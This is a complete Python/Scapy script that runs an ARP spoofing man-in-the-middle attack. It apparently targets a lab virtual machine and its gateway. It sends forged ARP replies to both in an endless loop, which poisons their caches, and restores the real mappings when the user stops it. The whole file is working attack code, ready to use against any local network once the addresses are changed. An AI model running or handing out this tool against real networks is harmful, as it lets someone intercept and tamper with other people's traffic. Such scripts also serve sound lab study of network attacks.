from scapy.all import *
import time

IFACE = "\\Device\\NPF_{893D45BA-2CDB-421D-B887-F184ACEB8DDB}"

target_ip = "192.168.56.10"        # Victim VM
target_mac = "08:00:27:c4:a5:eb"   # Victim VM MAC

gateway_ip = "192.168.56.1"        # Windows (Gateway)
gateway_mac = "0a:00:27:00:00:13"  # Windows MAC

def spoof(target_ip, target_mac, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False, iface=IFACE)
    print(f"[*] Sent ARP spoof: Telling {target_ip} that {spoof_ip} is at our MAC")

def restore():
    packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                  psrc=gateway_ip, hwsrc=gateway_mac)
    packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, 
                  psrc=target_ip, hwsrc=target_mac)
    send(packet1, count=4, verbose=False, iface=IFACE)
    send(packet2, count=4, verbose=False, iface=IFACE)
    print("[*] Network restored!")

try:
    count = 0
    print(f"[*] Starting ARP Spoofing attack...")
    print(f"[*] Target: {target_ip} ({target_mac})")
    print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")
    print(f"[*] Press Ctrl+C to stop\n")
    while True:
        spoof(target_ip, target_mac, gateway_ip)
        spoof(gateway_ip, gateway_mac, target_ip)
        count += 2
        print(f"[*] Total Packets Sent: {count}")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[*] Stopping attack...")
    restore()